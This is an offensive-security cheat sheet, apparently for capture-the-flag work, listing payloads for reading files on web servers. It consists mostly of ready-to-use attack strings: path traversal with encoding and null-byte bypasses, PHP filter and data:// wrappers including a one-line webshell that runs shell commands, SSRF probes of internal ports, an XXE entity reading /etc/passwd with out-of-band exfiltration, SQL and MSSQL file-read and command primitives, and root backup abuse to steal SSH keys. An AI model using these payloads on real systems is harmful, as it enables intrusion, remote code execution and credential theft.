# Traversal Bypass, PHP Wrappers & Non-HTTP File Read

## Path traversal variants (test in order)
```bash
# Absolute path (apps using os.path.join or readlink semantics accept it)
?page=/etc/passwd
# Basic traversal
?page=../../../etc/passwd
# Filtered ../ → double-encode / nested dots
?page=....//....//etc/passwd        # strip ".." from "....//" leaves "../"
?page=%252e%252e%252fetc%252fpasswd # double URL-encode when one decode happens
# Null-byte suffix bypass (old PHP/CFM: strips .php check)
?page=../../../etc/passwd%00
# Path param can't contain "/" → base64 it (API path-style file endpoints)
FN=$(echo -n /etc/passwd | base64 | tr '/+' '_-' | tr -d '=')
curl ".../file/$FN"
```

## PHP wrappers (read source, bypass filters, RCE chain)
```bash
# Read PHP source as base64 (must decode)
?page=php://filter/convert.base64-encode/resource=index.php
# Nested filters to prepend magic bytes (wrapwrap / iconv chain) — bypass magic-byte checks
# e.g. GIF prefix then read source:
?page=php://filter/convert.iconv.utf8.utf16/convert.base64-encode/resource=... 
# Zip wrapper: read file inside uploaded archive
?page=zip://uploads/x.zip%23shell.php
# include() instead of read → direct RCE if param is include'd:
?page=data://text/plain;base64,<b64><?php system($_GET['c']);?>
?page=php://input            # send body as code
```
- Know the difference: `include`/`require` = RCE; `file_get_contents`/`readfile`/`send_file` = read only. Read source to confirm which.

## SSRF as file read
```bash
# If url= is fetched server-side and response is returned:
?url=file:///etc/passwd
?url=http://127.0.0.1:3002/        # internal service browse
?url=http://127.0.0.1:FUZZ         # wfuzz internal port scan (size filter)
# Denylist bypass with attacker 302 redirector: your server issues 302 → internal URL
# curl multi-URL: "http://x file:///etc/passwd" bypasses scheme filter in curl-based fetchers
```

## XXE as file read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
<!-- PHP libxml: PHP://filter base64 in entity to read binary; expect only if parse errors leak -->
```
- Blind XXE → out-of-band (`file:///etc/passwd` into external DTD that exfils to your server), or error-based.

## Zip/archive traversal & parser differentials
- Stacked zips (PHP ZipArchive vs unzip disagree), null-byte filename, polyglot (PDF stream + code, PEM key + PHP comment).
- Zip entry names with `../../` read/write outside extraction dir.

## Non-HTTP file-read primitives
- SQLi `LOAD_FILE('/etc/passwd')` / `INTO OUTFILE` (MySQL/MariaDB).
- MSSQL `xp_cmdshell type C:\...` or `OPENROWSET(BULK...)`.
- Backup tools (restic/backy/npbackup) run as root: add `/root` to backup paths → restore/download → SSH key + flag (see `read-to-rce.md`).
- `.scf`/`.lnk` on a share → NTLM capture; registry hives via SeBackupPrivilege (`reg save`).
- `/proc/<pid>/cmdline|environ` via any file read (see `proc-and-source-enum.md`).

## Cleanup & parsing
```bash
curl -s '...?page=/proc/self/cmdline' | tr '\000' ' '
curl -s '...?page=php://filter/.../resource=index.php' | base64 -d
# strip param-echo prefix + footer junk:
curl -s '...' | cut -c115- | rev | cut -c32- | rev
```
